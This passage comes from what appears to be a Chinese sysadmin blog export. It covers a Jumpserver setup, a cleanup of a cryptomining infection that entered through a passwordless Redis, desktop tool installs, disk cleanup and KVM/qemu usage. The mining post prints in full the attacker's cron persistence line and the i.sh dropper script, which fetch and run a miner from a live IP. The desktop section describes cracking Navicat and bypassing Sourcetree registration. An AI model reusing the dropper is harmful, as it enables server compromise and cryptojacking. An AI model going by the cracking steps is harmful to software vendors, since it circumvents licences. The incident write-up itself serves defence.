登录是否支持秘钥认证 # PUBLIC_KEY_AUTH = True # SSH白名单 # ALLOW_SSH_USER = &apos;all&apos; # [&apos;test&apos;, &apos;test2&apos;] # SSH黑名单, 如果用户同时在白名单和黑名单，黑名单优先生效 # BLOCK_SSH_USER = [] # 和Jumpserver 保持心跳时间间隔 # HEARTBEAT_INTERVAL = 5 # Admin的名字，出问题会提示给用户 # ADMINS = &apos;&apos; COMMAND_STORAGE = &#123; &quot;TYPE&quot;: &quot;server&quot; &#125; REPLAY_STORAGE = &#123; &quot;TYPE&quot;: &quot;server&quot; &#125; # SSH连接超时时间 (default 15 seconds) # SSH_TIMEOUT = 15 # 语言 = en LANGUAGE_CODE = &apos;zh&apos;config = Config()# 安装 Web Terminal 前端: Luna 需要 Nginx 来运行访问 访问（https://github.com/jumpserver/luna/releases）下载对应版本的 release 包，直接解压，不需要编译$ cd /data/opt$ wget https://github.com/jumpserver/luna/releases/download/1.4.1/luna.tar.gz$ tar xvf luna.tar.gz$ chown -R root:root luna# 配置 Nginx 整合各组件$ vim /etc/nginx/conf.d/jumpserver.confserver &#123; listen 80; client_max_body_size 100m; # 录像上传大小限制 location /luna/ &#123; try_files $uri / /index.html; alias /data/opt/luna/; # luna 路径，如果修改安装目录，此处需要修改 &#125; location /media/ &#123; add_header Content-Encoding gzip; root /data/opt/jumpserver/data/; # 录像位置，如果修改安装目录，此处需要修改 &#125; location /static/ &#123; root /data/opt/jumpserver/data/; # 静态资源，如果修改安装目录，此处需要修改 &#125; location /socket.io/ &#123; proxy_pass http://localhost:5000/socket.io/; # 如果coco安装在别的服务器, 请填写它的ip proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location /guacamole/ &#123; proxy_pass http://localhost:8081/; # 如果docker安装在别的服务器, 请填写它的ip proxy_buffering off; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $http_connection; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; access_log off; &#125; location / &#123; proxy_pass http://localhost:8080; # 如果jumpserver安装在别的服务器, 请填写它的ip proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;# 生成数据库表结构和初始化数据$ cd /data/opt/jumpserver/utils$ bash make_migrations.sh# 运行 Jumpserver$ cd /data/opt/jumpserver$ ./jms start all # 后台运行使用 -d 参数./jms start all -d# 新版本更新了运行脚本，使用方式./jms start|stop|status|restart all 后台运行请添加 -d 参数# 运行 Coco$ cd /data/opt/coco$ ./cocod start # 后台运行使用 -d 参数./cocod start -d# 新版本更新了运行脚本，使用方式./cocod start|stop|status|restart 后台运行请添加 -d 参数# 运行 Nginx$ nginx -t # 确保配置没有问题, 有问题请先解决$ service nginx start# 访问 http://xx.xx.xx.xx (注意，没有 :8080，通过 nginx 代理端口进行访问)# 默认账号: admin 密码: admin 到会话管理-终端管理 接受 Coco Guacamole 等应用的注册# 测试连接$ ssh -p2222 admin@xx.xx.xx.xx$ sftp -P2222 admin@xx.xx.xx.xx 密码: admin##当然密码已经改了# 如果是用在 Windows 下，Xshell Terminal 登录语法如下$ ssh admin@xx.xx.xx.xx 2222$ sftp admin@xx.xx.xx.xx 2222 密码: admin 如果能登陆代表部署成功# sftp默认上传的位置在资产的 /tmp 目录下# 其他的ssh及sftp客户端这里就不多做说明，自行搜索使用]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Jumpserver</tag>
        <tag>Mariadb-10.2.15</tag>
        <tag>Coco</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次挖矿病毒处理qW3xT.2]]></title>
    <url>%2Fproblem180812.html</url>
    <content type="text"><![CDATA[问题发现及解决​ 在ucloud使用redis，开启了6379端口，但是当时并没有对redis的密码进行设置复杂的设置，设置的为123456。 使用top命令查询，发现cpu异常占用过高。99%以上 ​ qW3xT.2程序和ddgs.3013程序，看起来就不是正常的程序。google了一下，发现是美国的一个挖矿程序。 ​ 进入/tmp文件夹下。发现qW3xT.2文件，删除。之后kill掉qW3xT.2该进程，但是一段时间之后，发现该行程又重新启动。 ​ 一段时间之后，删除的文件重新生成，dds和挖矿的进程又重新执行。此时怀疑是否有计划任务，此时查看计划任务的列表 1234567]# find / -name qW3xT.2]# find / -name ddgs.3013]# crontab -l */15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh]# cd /var/spool/cron/]# rm -rf * ]# crontab -l ##任务计划清除完毕。 ​ 分析一下挖矿脚本 12345678910111213141516171819202122232425262728]# curl -fsSL http://149.56.106.215:8000/i.sh | shexport PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbinecho &quot;&quot; &gt; /var/spool/cron/rootecho &quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/rootecho &quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/rootmkdir -p /var/spool/cron/crontabsecho &quot;&quot; &gt; /var/spool/cron/crontabs/rootecho &quot;*/15 * * * * curl -fsSL http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/crontabs/rootecho &quot;*/15 * * * * wget -q -O- http://149.56.106.215:8000/i.sh | sh&quot; &gt;&gt; /var/spool/cron/crontabs/rootps auxf | grep -v grep | grep /tmp/ddgs.3013 || rm -rf /tmp/ddgs.3013if [ ! -f &quot;/tmp/ddgs.3013&quot; ]; then wget -q http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -O /tmp/ddgs.3013 curl -fsSL http://149.56.106.215:8000/static/3013/ddgs.$(uname -m) -o /tmp/ddgs.3013fichmod +x /tmp/ddgs.3013 &amp;&amp; /tmp/ddgs.3013ps auxf | grep -v grep | grep Circle_MI | awk &apos;&#123;print $2&#125;&apos; | xargs killps auxf | grep -v grep | grep get.bi-chi.com | awk &apos;&#123;print $2&#125;&apos; | xargs killps auxf | grep -v grep | grep hashvault.pro | awk &apos;&#123;print $2&#125;&apos; | xargs killps auxf | grep -v grep | grep nanopool.org | awk &apos;&#123;print $2&#125;&apos; | xargs killps auxf | grep -v grep | grep minexmr.com | awk &apos;&#123;print $2&#125;&apos; | xargs killps auxf | grep -v grep | grep /boot/efi/ | awk &apos;&#123;print $2&#125;&apos; | xargs kill#ps auxf | grep -v grep | grep ddg.2006 | awk &apos;&#123;print $2&#125;&apos; | kill#ps auxf | grep -v grep | grep ddg.2010 | awk &apos;&#123;print $2&#125;&apos; | kill ​ 解决redis入口问题，因为最开始没有设置密码，所以首先修改redis.conf。设置密码，然后重启redis。 总结​ 知名应用程序的端口应避免使用默认端口，认证密码应稍微复杂，避免使用888888,123456等简单密码。]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>problem</tag>
        <tag>病毒</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[运维桌面软件应用安装]]></title>
    <url>%2Fopsenv.html</url>
    <content type="text"><![CDATA[一、Navicat for mysql 下载地址：Navicat Premium（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_premium_trial_64.exeNavicat Premium Mac版：http://download3.navicat.com/download/navicat111_premium_cs.dmgNavicat for MySQL（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_x64_trial.exeNavicat for MySQL Mac版：http://download3.navicat.com/download/navicat111_mysql_cs.dmgNavicat for SQL Server（64 bit）简体中文版：http://xiazai.formysql.com/trial/navicat_sqlserver_trial_64.exe 解压 破解，https://download.csdn.net/download/qq_39238554/10285323 123451.安装原版的Navicat for MySQL 记住安装目录，有用2.把“PatchNavicat.exe”文件放到软件安装目录下3.运行PatchNavicat.exe4.选择Navicat主程序navicat.exe为其打上补丁即可。5.破解后启动软件，不会再提醒要需要注册了 二、Xshell/Xftp下载安装 下载 Xshell6：https://www.netsarang.com/products/xsh_overview.html Xftp6： https://www.netsarang.com/products/xfp_overview.html 下载完毕后，点击安装，按需安装至相关文件夹 使用 123451.打开桌面的Xshell，进行软件首界面，选择新建2.填写名称、协议、主机号和端口号，点击确定按钮3.进入会话对话框，选择要连接的账户，点击连接按钮4.输入用户登录名，点击确定按钮5.输入登录密码，点击确定，连接成功 三、git安装 从官网下载：https://git-scm.com/downloads 安装即可 右击鼠标，出现Git Gui Here 和Git Bash Here,说明安装成功 全局设置,点击Git Bash Here.进入命令行界面。 12$ git config --global user.name &quot;Your Name&quot;$ git config --global user.email &quot;email@example.com&quot; 四、Sourcetree安装安装好Git后，可以安装Sourcetree了， 下载软件地址：https://www.sourcetreeapp.com/ ------&gt;Download 下载好后，直接进行安装，这里需要跳过注册 在windows资源管理器里输入 12345678910111213141516171819202122232425262728%LocalAppData%\Atlassian\SourceTree\新建一个accounts.json，内容如下，保存重启[ &#123; &quot;$id&quot;: &quot;1&quot;, &quot;$type&quot;: &quot;SourceTree.Api.Host.Identity.Model.IdentityAccount, SourceTree.Api.Host.Identity&quot;, &quot;Authenticate&quot;: true, &quot;HostInstance&quot;: &#123; &quot;$id&quot;: &quot;2&quot;, &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountInstance, SourceTree.Host.AtlassianAccount&quot;, &quot;Host&quot;: &#123; &quot;$id&quot;: &quot;3&quot;, &quot;$type&quot;: &quot;SourceTree.Host.Atlassianaccount.AtlassianAccountHost, SourceTree.Host.AtlassianAccount&quot;, &quot;Id&quot;: &quot;atlassian account&quot; &#125;, &quot;BaseUrl&quot;: &quot;https://id.atlassian.com/&quot; &#125;, &quot;Credentials&quot;: &#123; &quot;$id&quot;: &quot;4&quot;, &quot;$type&quot;: &quot;SourceTree.Model.BasicAuthCredentials, SourceTree.Api.Account&quot;, &quot;Username&quot;: &quot;&quot;, &quot;Email&quot;: null &#125;, &quot;IsDefault&quot;: false &#125;] 进sourcetree页面，开启仓库克隆及拉取操作，Mecurial插件可以按需安装。用Git可以跳过。 进入sourcetree后,点击clone，添加仓库 123url: http://139.224.43.8:88/qianxiang/web.git #git仓库名称路径path：E:\source_code\qianxiang\web #存放本地的磁盘位置如#点击构建即可 分支管理。 1234Git工作流中，将&quot;/&quot; ---&gt; &quot;_&quot; feature/ ---&gt; feature_ release/ ---&gt; release_ hotfix/ ---&gt; hotfix_ 用git命令行模式管理分支 12git pull git checkout release_1000252_08241100 #切换分支 合并分支并查询差异，告知相关负责人。 五、TortoiseSVN安装 官网下载：https://tortoisesvn.net/downloads.html 一直点击下一步，直到安装完成，安装TortoiseSVN并没有管理界面，但当你鼠标右击的时候，会多出SVN Checkout…和TortoiseSVN这两个选项。 简单配置 1234点击“SVN Checkout”后弹出对话框，URL of repository填写你的公司或组织给你的svn地址，Checkout directory:设置要将svn上的文件下载到本地的存储路径，点击ok]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Navicat</tag>
        <tag>git</tag>
        <tag>sourcetree</tag>
        <tag>xshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[磁盘清理]]></title>
    <url>%2Fdisk.html.html</url>
    <content type="text"><![CDATA[磁盘利用率100%问题解决1234567df -h 查看磁盘占用率100%分析相关问题1. df -i查看inode号是否占用，一般情况不会占用。2. cd / &amp;&amp; du -h --max-depth=1 ,查看根目录文件大小 是否是磁盘大小。是的话选中3，否的话选择4.3. lsof |grep deleted 查看释放空间，发现jenkins占用16G,kill -9 jenkis对应的pid,重启jenkins。4. find / -size +100M -exec ls -lh &#123;&#125; \; 查询根目录下大于100M文件，并列出来。按不需删除。这次真实的原因是因为磁盘中比较大并且以有在使用的数据，但是在删除的时候使用的是rm命令直接删除]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>disk</tag>
        <tag>find</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kvm初探]]></title>
    <url>%2Fkvm.html</url>
    <content type="text"><![CDATA[摘要： 虚拟化技术 KVM： Kernel-based Virtual Machine qemu-kvm管理 libvirt工具管理 虚拟化技术 第一代：真空管，穿孔卡片 第二代：晶体管，批处理系统 第三代：集成电路，多道程序设计 第四代：PC 虚拟化要求1234Poke, Glodberg 提出虚拟化的三要素 等价执行 性能良好 安全隔离 CPU虚拟化 12345678emulation 模拟r0-r3 ---60%virtulization 模拟r0 完全虚拟化（full-virtulazition） BT：binary translation 二进制翻译（软件上） ----85% HVM：硬件辅助虚拟化 半虚拟化（para-virtulation） ---必须修改cpu内核，才可以实现半虚拟化 ---95% 各Guest的主机明确知道Host主机的存在 vm monitor == hypeivisor ----hyper call特权指令的调用 HVM 123456cpu有5个环，比传统的多一个环。 r-1 -----Host 主机内核上的特权指令 r 0 r 1 r 2 r 3 -----Guest 用户空间 Memory的虚拟 123456789101112131415进程：线性地址空间内核：物理地址空间Guest 的虚拟内存必须是连续的，但是hypervisor给其分配的物理内存分散的 shadow page table tlb缓存命中率低下mmu虚拟化：GVA---GPA，同步进行GVA---HPA intel：EPT，Extended page table AMD:NTP,Nested Page Table GVA：guest virtul address GPA：guest visible address HPA：hypervisor visible addressTLB 虚拟化 tagged TLB ----&gt; 直接缓存GVA---HPA记录，命中率大大提高 I/O1234567891011121314151617181920外存 硬盘/光盘/U盘网络设备 网卡显示设备 VGA：frame buffer机制，由于存在硬件加速，显卡虚拟效果不佳键盘鼠标 PS/2，usb I/O的虚拟化方式： 模拟：使用软件模拟真实硬件 在Guest也存在调用设备，然后在hypervisor上存在 IO stack，继续调用。 半虚拟化：和CPU半虚拟化类似 IO frontend ----&gt; IO backend I/O-through：I/O透传技术 guest直接访问真实的I/O设备----VT-d+IOV技术Intel: VT-d IOmmu技术 基于北桥的硬件辅助的虚拟化技术 两种技术实现方式 123456Type—I型 硬件上安装hypervisor xens，vmware ESX/ESXiType-II型 硬件上安装hosts kvm，virtualbox，vmware workstation 总结 Interl硬件辅助的虚拟化 123456cpu：vt-x,EPT,tagged-TLBIO/CPU:vt-d,vt-x,IOV,VMDq处理器相关：vt-x芯片相关：vt-dIO相关：SR-IOV，VMDq 虚拟化技术 123456789101112131415161718192021222324252627模拟：著名的模拟器，Pearpc，Bochs，QEMU 上层-------guest 上层-------emulation 上层-------hosts 底层-------硬件完全虚拟化 native virtulizition 加速方式：BT，HVM VMware Workstation,VMware Server，Parallels Desktop，KVM,Xens(HVM)半虚拟化:para-virtulizition 上层---------guest（需要修改内核参数） 上层---------hypercisor，hyper call 底层---------硬件 xen,uml(user-mode linux) OS级别虚拟化： 上层---------用户空间，虚拟管理器 上层---------内核 底层---------硬件 OpenVZ，lxc，Solris Containers，FreeBSd jails库虚拟化： wine， 如在ubuntu上安装qq，魔兽等windows。应用程序虚拟化： jvm， 虚拟化网络 123456桥接 hsots上的网卡，可以看成一个交换机设备。各虚拟机和hosts处于等同地位路由模型 hosts软件虚拟一网卡，仅主机nat hosts软件虚拟化一个网卡。将guset元ip地址改为hosts的ip地址。 tun与tap 12345678在计算机网络中，TUN与TAP是操作系统内核中的虚拟网络设备，不同于普通依赖硬件网路板卡实现的设备。TAP等同于一个以太网设备，操作第二层数据包如以太网数据帧。TUN模拟了网络层设备，操作第三层数据包如IP数据包。操作系统通过TUN/TAP设备向绑定该设备的用户空间的程序发送数据，反之，用户空间程序也可以像操作硬件网络设备一样，通过TUN/TAP设备发送数据。 TUN/TAP设备宝贝向操作系统的网络栈发送投递数据包，从而模拟从外部接受数据的过程。 安装创建桥服务，重启会丢失数据。建议写成脚本。 12345678]# chkconfig disable NetworkManager]# chkconfig enable network]# yum install bridge-utils -y]# brctl addbr br0]# ifconfig eth0 0 up]# brctl addif br0 eth0]# ifconfig br0 172.20.0.24/16 up]# route add default gw 172.20.0.1 KVMKVM：Kernel-based Virtual Machine,以色列Qumranet公司开发，2009年被redhat收购 qemu：创建并管理虚拟机的工具，额外实现模拟I/O的工具。 12345678 将guest的内核空间转移---r1上]# modprobe kvm]# lsmod |grep kvmkvm_intel 204800 0kvm 593920 1 kvm_intelirqbypass 16384 1 kvm]# ll /dev/kvmcrw------- 1 root root 10, 232 jul 26 09:35 /dev/kvm KVM组件 1234567/dev/kvm: 管理虚拟机的设备文件 创建虚拟机 为虚拟机分配内存 读写VCPU的寄存器 向VCPU注入中断 运行VCPUqemu进程：工作与用户空间的组建，用于仿真PC机的I/O类硬件设备。 virt 1234]# yum list *virt* #redhat安装kvm的虚拟库，如果要安装zens，则需要用到zen的库]# yum info qemu-kvm qemu-kvm-tools]# yum install -y qemu-kvm qemu-kvm-tools]# ln -sv /usr/libexec/qemu-kvm /usr/sbin/ #软链接一个，没有PATH变量 qemu-kvm的用法 标准选项 1234567891011121314151617181920212223qemu-kvm的标准选项主要涉及指定主机类型、CPU模式、NUMA、软驱设备、光驱设备及硬件设备等。 -name name：设定虚拟机名称； -M machine：指定要模拟的主机类型，如Standard PC、ISA-only PC或Intel-Mac等，可以使用“qemu-kvm -M ?”获取所支持的所有类型； -m megs：设定虚拟机的RAM大小； -cpu model：设定CPU模型，如coreduo、qemu64等，可以使用“qemu-kvm -cpu ?”获取所支持的所有模型； -smp n[,cores=cores][,threads=threads][,sockets=sockets][,maxcpus=maxcpus]：设定模拟的SMP架构中CPU的个数等、每个CPU的核心数及CPU的socket数目等；PC机上最多可以模拟255颗CPU；maxcpus用于指定热插入的CPU个数上限； -numa opts：指定模拟多节点的numa设备； -fda file -fdb file：使用指定文件(file)作为软盘镜像，file为/dev/fd0表示使用物理软驱； -hda file -hdb file -hdc file -hdd file：使用指定file作为硬盘镜像； -cdrom file：使用指定file作为CD-ROM镜像，需要注意的是-cdrom和-hdc不能同时使用；将file指定为/dev/cdrom可以直接使用物理光驱； -drive option[,option[,option[,...]]]：定义一个新的硬盘设备；可用子选项有很多。 file=/path/to/somefile：硬件映像文件路径； if=interface：指定硬盘设备所连接的接口类型，即控制器类型，如ide、scsi、sd、mtd、floppy、pflash及virtio等； index=index：设定同一种控制器类型中不同设备的索引号，即标识号； media=media：定义介质类型为硬盘(disk)还是光盘(cdrom)； snapshot=snapshot：指定当前硬盘设备是否支持快照功能：on或off； cache=cache：定义如何使用物理机缓存来访问块数据，其可用值有none、writeback、unsafe和writethrough四个； format=format：指定映像文件的格式，具体格式可参见qemu-img命令； -boot [order=drives][,once=drives][,menu=on|off]：定义启动设备的引导次序，每种设备使用一个字符表示；不同的架构所支持的设备及其表示字符不尽相同，在x86 PC架构上，a、b表示软驱、c表示第一块硬盘，d表示第一个光驱设备，n-p表示网络适配器；默认为硬盘设备； 显示选项 1234567891011121314显示选项用于定义虚拟机启动后的显示接口相关类型及属性等。 -nographic：默认情况下，qemu使用SDL来显示VGA输出；而此选项用于禁止图形接口，此时,qemu类似一个简单的命令行程序，其仿真串口设备将被重定向到控制台； -curses：禁止图形接口，并使用curses/ncurses作为交互接口； -alt-grab：使用Ctrl+Alt+Shift组合键释放鼠标； -ctrl-grab：使用右Ctrl键释放鼠标； -sdl：启用SDL； -spice option[,option[,...]]：启用spice远程桌面协议；其有许多子选项，具体请参照qemu-kvm的手册； -vga type：指定要仿真的VGA接口类型，常见类型有： cirrus：Cirrus Logic GD5446显示卡； std：带有Bochs VBI扩展的标准VGA显示卡； vmware：VMWare SVGA-II兼容的显示适配器； qxl：QXL半虚拟化显示卡；与VGA兼容；在Guest中安装qxl驱动后能以很好的方式工作，在使用spice协议时推荐使用此类型； none：禁用VGA卡； -vnc display[,option[,option[,...]]]：默认情况下，qemu使用SDL显示VGA输出；使用-vnc选项，可以让qemu监听在VNC上，并将VGA输出重定向至VNC会话；使用此选项时，必须使用-k选项指定键盘布局类型；其有许多子选项，具体请参照qemu-kvm的手册； 网络选项 12345678910111213网络属性相关选项用于定义网络设备接口类型及其相关的各属性等信息。这里只介绍nic、tap和user三种类型网络接口的属性，其它类型请参照qemu-kvm手册。 -net nic[,vlan=n][,macaddr=mac][,model=type][,name=name][,addr=addr][,vectors=v]：创建一个新的网卡设备并连接至vlan n中；PC架构上默认的NIC为e1000，macaddr用于为其指定MAC地址，name用于指定一个在监控时显示的网上设备名称；emu可以模拟多个类型的网卡设备，如virtio、i82551、i82557b、i82559er、ne2k_isa、pcnet、rtl8139、e1000、smc91c111、lance及mcf_fec等；不过，不同平台架构上，其支持的类型可能只包含前述列表的一部分，可以使用“qemu-kvm -net nic,mode=?”来获取当前平台支持的类型； -net tap[,vlan=n][,name=name][,fd=h][,ifname=name][,script=file][,downscript=dfile]：通过物理机的TAP网络接口连接至vlan n中，使用script=file指定的脚本(默认为/etc/qemu-ifup)来配置当前网络接口，并使用downscript=file指定的脚本(默认为/etc/qemu-ifdown)来撤消接口配置；使用script=no和downscript=no可分别用来禁止执行脚本； -net user[,option][,option][,...]：在用户模式配置网络栈，其不依赖于管理权限；有效选项有： vlan=n：连接至vlan n，默认n=0； name=name：指定接口的显示名称，常用于监控模式中； net=addr[/mask]：设定GuestOS可见的IP网络，掩码可选，默认为10.0.2.0/8； host=addr：指定GuestOS中看到的物理机的IP地址，默认为指定网络中的第二个，即x.x.x.2； dhcpstart=addr：指定DHCP服务地址池中16个地址的起始IP，默认为第16个至第31个，即x.x.x.16-x.x.x.31； dns=addr：指定GuestOS可见的dns服务器地址；默认为GuestOS网络中的第三个地址，即x.x.x.3； tftp=dir：激活内置的tftp服务器，并使用指定的dir作为tftp服务器的默认根目录； bootfile=file：BOOTP文件名称，用于实现网络引导GuestOS；如：qemu -hda linux.img -boot n -net user,tftp=/tftpserver/pub,bootfile=/pxelinux.0 一个例子 12345678下面的命令创建了一个名为rhel7.5的虚拟机，其RAM大小为512MB，有两颗CPU的SMP架构，默认引导设备为硬盘，有一个硬盘设备和一个光驱设备，网络接口类型为virtio，VGA模式为cirrus，并启用了balloon功能。]# qemu-kvm -name &quot;rhel7.5&quot; -m 512 \-smp 2 -boot d \-drive file=/VM/images/rhel7.5/hda,if=virtio,index=0,media=disk,format=qcow2 \-drive file=/isos/rhel-7.5.iso,index=1,media=cdrom \-net nic,model=virtio,macaddr=52:54:00:A5:41:1E \-vga cirrus -balloon virtio qemu-img命令使用选项 123456789#create 创建#resize 增加大小#convert 转化#snapshot 快照]# qemu-img --help]# qemu-img create -f qcow2 -o size=20G /images/vm1/c1.qcow2]# qemu-img conver -O vmdk -o adapter_type=lsilogic c1.qcow2 c1.vmdk]# qemu-img snapshot -c c1.snap c1.qcow2 安装虚拟机实验 1234567891011121314151617181920212223下载iso镜像 ]# modprobe kvm]# modprobe kvm_intel]# mkdir /images/vml -pv]# qemu-img create -f qcow2 -o size=40G /images/vml/ubuntu.qcow2]# qemu-img resize /images/vml/ubuntu.qcow2 50G]# ls -lh /images/vml/ubuntu.qcow2]# yum install -y tigervnc #安装vnc客户端#had模式]# qemu-kvm -name &apos;ubuntu&apos; -m 768 -smp 4 -hda /images/vml/ubuntu.qcow2 \-cdrom ubuntu-16.10-desktop-amd64.iso -boot order=dc#前台运行的]# vncviewer ：5900进行安装界面#drive模式]# qemu-kvm -name &apos;win7&apos; -m 768 -smp 4 -drive \file=/images/vml/ubuntu.qcow2,if=ide,index=0,media=disk,format=qcow2 \-drive file=/root/cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso,\media=cdrom,index=1 -boot order=dc qemu-KVM其他可能用到的选项 12345678910#在monitor下实现实时迁移：-incoming tcp:0:port#qemu-kvm运行后台：-daemonize#打开声音设备：-soundhw#设定iscsi存储设备 # qemu-kvm -iscsi initiator-name= -drive \ file=iscsi://&lt;ip&gt;[:port]/&lt;target_iqn&gt;/&lt;lun&gt;#设定bios： -bios /path/to/some_bios_program KVM-libvirt 基于C/S架构，virsh，virt-manager，virt-install，virt-clone，virt-convert，virt-copy等管理工具，使用原始的qemu-kvm管理过于繁琐，命令行复杂。需要对很多选项熟悉才能玩得转。 前期环境准备 12345678910111213]# yum install -y libvirt libvirt-daemon-kvm qemu-kvm virt-manager]# systemctl start libvirtd.service#######创建br0容易发生错误########### ###ens37为桥接网卡，且获取ip为dhcp方式###]# virsh iface-bridge ens37 br1 || systemctl restart network]# virt-install -n &quot;centos6&quot; --vcpus 2 -r 512 \-l http://172.20.0.1/cobbler/ks_centsos6.9 \--disk path=/images/vm/centos6.qcow2,bus=virtio,size=120,sparse--network bridge=br0,model=virtio--force]# virt-manager &amp; virt-install是一个命令行工具，它能够为KVM、Xen或其它支持libvrit API的hypervisor创建虚拟机并完成GuestOS安装；此外，它能够基于串行控制台、VNC或SDL支持文本或图形安装界面。安装过程可以使用本地的安装介质如CDROM，也可以通过网络方式如NFS、HTTP或FTP服务实现。对于通过网络安装的方式，virt-install可以自动加载必要的文件以启动安装过程而无须额外提供引导工具。当然，virt-install也支持PXE方式的安装过程，也能够直接使用现有的磁盘映像直接启动安装过程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960virt-install命令有许多选项，这些选项大体可分为下面几大类，同时对每类中的常用选项也做出简单说明。 一般选项：指定虚拟机的名称、内存大小、VCPU个数及特性等； -n NAME, --name=NAME：虚拟机名称，需全局惟一； -r MEMORY, --ram=MEMORY：虚拟机内在大小，单位为MB； --vcpus=VCPUS[,maxvcpus=MAX][,sockets=#][,cores=#][,threads=#]：VCPU个数及相关配置； --cpu=CPU：CPU模式及特性，如coreduo等；可以使用qemu-kvm -cpu ?来获取支持的CPU模式； 安装方法：指定安装方法、GuestOS类型等； -c CDROM, --cdrom=CDROM：光盘安装介质； -l LOCATION, --location=LOCATION：安装源URL，支持FTP、HTTP及NFS等，如ftp://172.16.0.1/pub； --pxe：基于PXE完成安装； --livecd: 把光盘当作LiveCD； --os-type=DISTRO_TYPE：操作系统类型，如linux、unix或windows等； --os-variant=DISTRO_VARIANT：某类型操作系统的变体，如rhel5、fedora8等； -x EXTRA, --extra-args=EXTRA：根据--location指定的方式安装GuestOS时，用于传递给内核的额外选项，例如指定kickstart文件的位置，--extra-args &quot;ks=http://172.16.0.1/class.cfg&quot; --boot=BOOTOPTS：指定安装过程完成后的配置选项，如指定引导设备次序、使用指定的而非安装的kernel/initrd来引导系统启动等 ；例如： --boot cdrom,hd,network：指定引导次序； --boot kernel=KERNEL,initrd=INITRD,kernel_args=”console=/dev/ttyS0”：指定启动系统的内核及initrd文件； 存储配置：指定存储类型、位置及属性等； --disk=DISKOPTS：指定存储设备及其属性；格式为--disk /some/storage/path,opt1=val1，opt2=val2等；常用的选项有： device：设备类型，如cdrom、disk或floppy等，默认为disk； bus：磁盘总结类型，其值可以为ide、scsi、usb、virtio或xen； perms：访问权限，如rw、ro或sh（共享的可读写），默认为rw； size：新建磁盘映像的大小，单位为GB； cache：缓存模型，其值有none、writethrouth（缓存读）及writeback（缓存读写）； format：磁盘映像格式，如raw、qcow2、vmdk等； sparse：磁盘映像使用稀疏格式，即不立即分配指定大小的空间； --nodisks：不使用本地磁盘，在LiveCD模式中常用； 网络配置：指定网络接口的网络类型及接口属性如MAC地址、驱动模式等； -w NETWORK, --network=NETWORK,opt1=val1,opt2=val2：将虚拟机连入宿主机的网络中，其中NETWORK可以为： bridge=BRIDGE：连接至名为“BRIDEG”的桥设备； network=NAME：连接至名为“NAME”的网络；它常用的选项还有： model：GuestOS中看到的网络设备型号，如e1000、rtl8139或virtio等； mac：固定的MAC地址；省略此选项时将使用随机地址，但无论何种方式，对于KVM来说，其前三段必须为52:54:00； --nonetworks：虚拟机不使用网络功能； 图形配置：定义虚拟机显示功能相关的配置，如VNC相关配置； --graphics TYPE,opt1=val1,opt2=val2：指定图形显示相关的配置，此选项不会配置任何显示硬件（如显卡），而是仅指定虚拟机启动后对其进行访问的接口； TYPE：指定显示类型，可以为vnc、sdl、spice或none等，默认为vnc； port：TYPE为vnc或spice时其监听的端口； listen：TYPE为vnc或spice时所监听的IP地址，默认为127.0.0.1，可以通过修改/etc/libvirt/qemu.conf定义新的默认值； password：TYPE为vnc或spice时，为远程访问监听的服务进指定认证密码； --noautoconsole：禁止自动连接至虚拟机的控制台； 设备选项：指定文本控制台、声音设备、串行接口、并行接口、显示接口等； --serial=CHAROPTS：附加一个串行设备至当前虚拟机，根据设备类型的不同，可以使用不同的选项，格式为“--serial type,opt1=val1,opt2=val2,...”，例如： --serial pty：创建伪终端； --serial dev,path=HOSTPATH：附加主机设备至此虚拟机； --video=VIDEO：指定显卡设备模型，可用取值为cirrus、vga、qxl或vmvga； 虚拟化平台：虚拟化模型（hvm或paravirt）、模拟的CPU平台类型、模拟的主机类型、hypervisor类型（如kvm、xen或qemu等）以及当前虚拟机的UUID等； -v, --hvm：当物理机同时支持完全虚拟化和半虚拟化时，指定使用完全虚拟化； -p, --paravirt：指定使用半虚拟化； --virt-type：使用的hypervisor，如kvm、qemu、xen等；所有可用值可以使用’virsh capabilities’命令获取； 其它： --autostart：指定虚拟机是否在物理启动后自动启动； --print-xml：如果虚拟机不需要安装过程(--import、--boot)，则显示生成的XML而不是创建此虚拟机；默认情况下，此选项仍会创建磁盘映像； --force：禁止命令进入交互式模式，如果有需要回答yes或no选项，则自动回答为yes； --dry-run：执行创建虚拟机的整个过程，但不真正创建虚拟机、改变主机上的设备配置信息及将其创建的需求通知给libvirt； -d, --debug：显示debug信息；尽管virt-install命令有着类似上述的众多选项，但实际使用中，其必须提供的选项仅包括--name、--ram、--disk（也可是--nodisks）及安装过程相关的选项。此外，有时还需要使用括--connect=CONNCT选项来指定连接至一个非默认的hypervisor。 一个例子 